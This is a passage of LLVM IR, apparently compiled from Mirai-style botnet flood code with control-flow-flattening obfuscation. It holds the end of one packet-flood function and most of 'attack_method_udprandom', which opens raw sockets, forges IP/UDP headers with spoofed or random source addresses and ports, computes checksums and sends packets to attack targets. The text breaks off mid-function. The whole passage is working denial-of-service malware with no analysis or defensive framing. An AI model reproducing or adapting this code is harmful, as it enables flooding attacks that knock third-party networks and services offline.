  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %319, i32* %321, align 4
  store i32 -2139727461, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i32, i32* %21, align 4
  %324 = icmp eq i32 %323, -1
  %325 = select i1 %324, i32 1430814376, i32 -1068361147
  store i32 %325, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = call i32 @rand_next()
  %328 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 8
  store i32 %327, i32* %329, align 4
  store i32 -1068361147, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i16, i16* %13, align 2
  %332 = zext i16 %331 to i32
  %333 = icmp eq i32 %332, 65535
  %334 = select i1 %333, i32 876402025, i32 850944466
  store i32 %334, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = call i32 @rand_next()
  %337 = and i32 %336, 65535
  %338 = trunc i32 %337 to i16
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i32 0, i32 3
  %343 = load i16, i16* %342, align 4
  %344 = zext i16 %343 to i32
  %345 = sub nsw i32 %344, 1000
  %346 = xor i32 %345, -1
  %347 = trunc i32 %346 to i16
  %348 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i32 0, i32 3
  store i16 %347, i16* %349, align 4
  store i32 850944466, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i16, i16* %16, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp eq i32 %352, 65535
  %354 = select i1 %353, i32 1842089984, i32 -1443377919
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = call i32 @rand_next()
  %357 = and i32 %356, 65535
  %358 = trunc i32 %357 to i16
  %359 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i32 0, i32 0
  store i16 %358, i16* %360, align 2
  store i32 -1443377919, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i16, i16* %17, align 2
  %363 = zext i16 %362 to i32
  %364 = icmp eq i32 %363, 65535
  %365 = select i1 %364, i32 1486185571, i32 -633325682
  store i32 %365, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = call i32 @rand_next()
  %368 = and i32 %367, 65535
  %369 = trunc i32 %368 to i16
  %370 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 1
  store i16 %369, i16* %371, align 2
  store i32 -633325682, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i8, i8* %20, align 1
  %374 = icmp ne i8 %373, 0
  %375 = select i1 %374, i32 -1203727895, i32 -1420776430
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 9
  store i32 %377, i32* %379, align 4
  store i32 175383597, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 9
  %383 = load i32, i32* %382, align 4
  %384 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %385 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %384, i32 0, i32 9
  store i32 %383, i32* %385, align 4
  store i32 175383597, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  store i32 %387, i32* %37, align 4
  %388 = call i32 @rand_next()
  store i32 %388, i32* %38, align 4
  %389 = call i32 @rand_next()
  store i32 %389, i32* %39, align 4
  %390 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %391 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %390, i32 0, i32 0
  %392 = getelementptr inbounds [6 x i8], [6 x i8]* %391, i32 0, i32 0
  %393 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %392, i8* %393, i32 4)
  %394 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %395 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %394, i32 0, i32 1
  %396 = getelementptr inbounds [6 x i8], [6 x i8]* %395, i32 0, i32 0
  %397 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %396, i8* %397, i32 4)
  %398 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 0
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i32 0, i32 0
  %401 = getelementptr inbounds i8, i8* %400, i64 4
  %402 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %401, i8* %402, i32 2)
  %403 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %404 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %403, i32 0, i32 1
  %405 = getelementptr inbounds [6 x i8], [6 x i8]* %404, i32 0, i32 0
  %406 = getelementptr inbounds i8, i8* %405, i64 4
  %407 = bitcast i32* %39 to i8*
  %408 = getelementptr inbounds i8, i8* %407, i64 2
  call void @util_memcpy(i8* %406, i8* %408, i32 2)
  %409 = load i8, i8* %19, align 1
  %410 = icmp ne i8 %409, 0
  %411 = select i1 %410, i32 1571560148, i32 1193115656
  store i32 %411, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8*, i8** %36, align 8
  %414 = load i32, i32* %18, align 4
  call void @rand_str(i8* %413, i32 %414)
  store i32 1193115656, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  %416 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 7
  store i16 0, i16* %417, align 2
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = bitcast %struct.iphdr* %418 to i16*
  %420 = call zeroext i16 @checksum_generic(i16* %419, i32 20)
  %421 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 7
  store i16 %420, i16* %422, align 2
  %423 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 7
  store i16 0, i16* %424, align 2
  %425 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %426 = bitcast %struct.iphdr* %425 to i16*
  %427 = call zeroext i16 @checksum_generic(i16* %426, i32 20)
  %428 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 7
  store i16 %427, i16* %429, align 2
  %430 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %431 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %430, i32 0, i32 3
  store i16 0, i16* %431, align 2
  %432 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %433 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %434 = bitcast %struct.udphdr* %433 to i8*
  %435 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %436 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %435, i32 0, i32 2
  %437 = load i16, i16* %436, align 2
  %438 = load i32, i32* %18, align 4
  %439 = sext i32 %438 to i64
  %440 = add i64 8, %439
  %441 = trunc i64 %440 to i32
  %442 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %432, i8* %434, i16 zeroext %437, i32 %441)
  %443 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %444 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %443, i32 0, i32 3
  store i16 %442, i16* %444, align 2
  %445 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %449, i32 0, i32 0
  store i16 2, i16* %450, align 4
  %451 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 9
  %453 = load i32, i32* %452, align 4
  %454 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %455 = load i32, i32* %9, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %454, i64 %456
  %458 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i32 0, i32 0
  %459 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %458, i32 0, i32 2
  %460 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %459, i32 0, i32 0
  store i32 %453, i32* %460, align 4
  %461 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %462 = load i32, i32* %9, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %461, i64 %463
  %465 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i32 0, i32 0
  %466 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %465, i32 0, i32 1
  store i16 0, i16* %466, align 2
  %467 = load i32, i32* %10, align 4
  %468 = load i8*, i8** %30, align 8
  %469 = load i32, i32* %18, align 4
  %470 = sext i32 %469 to i64
  %471 = add i64 66, %470
  %472 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %473 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %474 = load i32, i32* %9, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %473, i64 %475
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %476, i32 0, i32 0
  %478 = bitcast %struct.sockaddr_in* %477 to %struct.sockaddr*
  store %struct.sockaddr* %478, %struct.sockaddr** %472, align 8
  %479 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %480 = load %struct.sockaddr*, %struct.sockaddr** %479, align 8
  %481 = call i64 @sendto(i32 %467, i8* %468, i64 %471, i32 16384, %struct.sockaddr* %480, i32 16)
  store i32 1687693672, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i32, i32* %9, align 4
  %484 = add nsw i32 %483, 1
  store i32 %484, i32* %9, align 4
  store i32 763549504, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  store i32 -1122231961, i32* %switchVar
  br label %loopEnd

; <label>:486:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %485, %482, %415, %412, %386, %380, %376, %372, %366, %361, %355, %350, %335, %330, %326, %322, %301, %269, %263, %262, %261, %258, %242, %234, %228, %219, %215, %162, %158, %104, %98, %97, %94, %88, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udprandom(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 1458)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  store i32 %69, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1992095731, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1992095731, label %first
    i32 -1214855076, label %72
    i32 1396550748, label %73
    i32 -1191336854, label %77
    i32 -1654153528, label %78
    i32 -1792491717, label %84
    i32 -131389298, label %87
    i32 382506596, label %88
    i32 1245735297, label %94
    i32 -1652705113, label %139
    i32 1955682296, label %143
    i32 32011017, label %172
    i32 1848210616, label %175
    i32 -141505433, label %176
    i32 969075326, label %177
    i32 -1339763725, label %183
    i32 -51212649, label %208
    i32 -220154536, label %229
    i32 1377883662, label %233
    i32 454584928, label %237
    i32 -886738573, label %242
    i32 -2122380965, label %247
    i32 321976264, label %252
    i32 -518675132, label %257
    i32 862984843, label %262
    i32 1625891304, label %267
    i32 -1550118166, label %271
    i32 1408721445, label %275
    i32 2059130992, label %322
    i32 -869965933, label %325
    i32 1568983970, label %326
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %70 = icmp sgt i32 %.reload, 1458
  %71 = select i1 %70, i32 -1214855076, i32 1396550748
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i16 1458, i16* %18, align 2
  store i32 1396550748, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %74, i32* %10, align 4
  %75 = icmp eq i32 %74, -1
  %76 = select i1 %75, i32 -1191336854, i32 -1654153528
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 1568983970, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %79 = load i32, i32* %10, align 4
  %80 = bitcast i32* %9 to i8*
  %81 = call i32 @setsockopt(i32 %79, i32 0, i32 3, i8* %80, i32 4) #6
  %82 = icmp eq i32 %81, -1
  %83 = select i1 %82, i32 -1792491717, i32 -131389298
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  store i32 1568983970, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 382506596, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  %93 = select i1 %92, i32 1245735297, i32 1848210616
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  store i8* %95, i8** %99, align 8
  %100 = load i8**, i8*** %11, align 8
  %101 = load i32, i32* %9, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8*, i8** %100, i64 %102
  %104 = load i8*, i8** %103, align 8
  %105 = bitcast i8* %104 to %struct.iphdr*
  store %struct.iphdr* %105, %struct.iphdr** %21, align 8
  %106 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i64 1
  %108 = bitcast %struct.iphdr* %107 to %struct.udphdr*
  store %struct.udphdr* %108, %struct.udphdr** %22, align 8
  %109 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %110 = bitcast %struct.iphdr* %109 to i8*
  %111 = load i8, i8* %110, align 4
  %112 = and i8 %111, 15
  %113 = or i8 %112, 64
  store i8 %113, i8* %110, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = and i8 %116, -16
  %118 = or i8 %117, 5
  store i8 %118, i8* %115, align 4
  %119 = load i8, i8* %12, align 1
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %120, i32 0, i32 1
  store i8 %119, i8* %121, align 1
  %122 = load i16, i16* %18, align 2
  %123 = zext i16 %122 to i64
  %124 = add i64 28, %123
  %125 = trunc i64 %124 to i16
  %126 = call zeroext i16 @htons(i16 zeroext %125) #7
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 2
  store i16 %126, i16* %128, align 2
  %129 = load i16, i16* %13, align 2
  %130 = call zeroext i16 @htons(i16 zeroext %129) #7
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 3
  store i16 %130, i16* %132, align 4
  %133 = load i8, i8* %14, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 5
  store i8 %133, i8* %135, align 4
  %136 = load i8, i8* %15, align 1
  %137 = icmp ne i8 %136, 0
  %138 = select i1 %137, i32 -1652705113, i32 1955682296
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %141 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 4
  store i16 %140, i16* %142, align 2
  store i32 1955682296, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 6
  store i8 17, i8* %145, align 1
  %146 = load i32, i32* %20, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 8
  store i32 %146, i32* %148, align 4
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 1
  %154 = load i32, i32* %153, align 4
  %155 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 9
  store i32 %154, i32* %156, align 4
  %157 = load i16, i16* %16, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %160 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %159, i32 0, i32 0
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %17, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %164 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %163, i32 0, i32 1
  store i16 %162, i16* %164, align 2
  %165 = load i16, i16* %18, align 2
  %166 = zext i16 %165 to i64
  %167 = add i64 8, %166
  %168 = trunc i64 %167 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %171 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  store i32 32011017, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load i32, i32* %9, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %9, align 4
  store i32 382506596, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -141505433, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 969075326, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = load i8, i8* %5, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp slt i32 %178, %180
  %182 = select i1 %181, i32 -1339763725, i32 -869965933
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i8**, i8*** %11, align 8
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8*, i8** %184, i64 %186
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %23, align 8
  %189 = load i8*, i8** %23, align 8
  %190 = bitcast i8* %189 to %struct.iphdr*
  store %struct.iphdr* %190, %struct.iphdr** %24, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i64 1
  %193 = bitcast %struct.iphdr* %192 to %struct.udphdr*
  store %struct.udphdr* %193, %struct.udphdr** %25, align 8
  %194 = call i32 @rand() #6
  %195 = srem i32 %194, 4096
  %196 = add nsw i32 %195, 1
  %197 = sext i32 %196 to i64
  %198 = inttoptr i64 %197 to i8*
  store i8* %198, i8** %26, align 8
  %199 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %199, i64 %201
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i32 0, i32 2
  %204 = load i8, i8* %203, align 4
  %205 = zext i8 %204 to i32
  %206 = icmp slt i32 %205, 32
  %207 = select i1 %206, i32 -51212649, i32 -220154536
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i32 0, i32 1
  %214 = load i32, i32* %213, align 4
  %215 = call i32 @ntohl(i32 %214) #7
  %216 = call i32 @rand_next()
  %217 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %218 = load i32, i32* %9, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i32 0, i32 2
  %222 = load i8, i8* %221, align 4
  %223 = zext i8 %222 to i32
  %224 = lshr i32 %216, %223
  %225 = add i32 %215, %224
  %226 = call i32 @htonl(i32 %225) #7
  %227 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i32 0, i32 9
  store i32 %226, i32* %228, align 4
  store i32 -220154536, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i32, i32* %20, align 4
  %231 = icmp eq i32 %230, -1
  %232 = select i1 %231, i32 1377883662, i32 454584928
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = call i32 @rand_next()
  %235 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 8
  store i32 %234, i32* %236, align 4
  store i32 454584928, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load i16, i16* %13, align 2
  %239 = zext i16 %238 to i32
  %240 = icmp eq i32 %239, 65535
  %241 = select i1 %240, i32 -886738573, i32 -2122380965
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = call i32 @rand_next()
  %244 = trunc i32 %243 to i16
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 3
  store i16 %244, i16* %246, align 4
  store i32 -2122380965, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  %248 = load i16, i16* %16, align 2
  %249 = zext i16 %248 to i32
  %250 = icmp eq i32 %249, 65535
  %251 = select i1 %250, i32 321976264, i32 -518675132
  store i32 %251, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = call i32 @rand_next()
  %254 = trunc i32 %253 to i16
  %255 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %256 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %255, i32 0, i32 0
  store i16 %254, i16* %256, align 2
  store i32 -518675132, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i16, i16* %17, align 2
  %259 = zext i16 %258 to i32
  %260 = icmp eq i32 %259, 65535
  %261 = select i1 %260, i32 862984843, i32 1625891304
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_next()
  %264 = trunc i32 %263 to i16
  %265 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i32 0, i32 1
  store i16 %264, i16* %266, align 2
  store i32 1625891304, i32* %switchVar
  br label %loopEnd

